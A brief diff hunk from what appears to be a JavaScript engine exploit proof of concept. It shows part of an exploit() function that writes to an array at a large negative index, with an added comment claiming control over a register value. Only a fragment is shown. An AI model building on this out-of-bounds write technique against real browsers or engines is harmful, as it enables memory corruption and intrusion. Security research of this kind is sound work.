@@ -13,7 +13,7 @@ function exploit() {
         parseInt();
     }
     arr[8] = 1;
-    arr[-0x12345678] = 2;
+    arr[-0x12345678] = 2; //We can control the value of X2.
 }
 
 exploit();
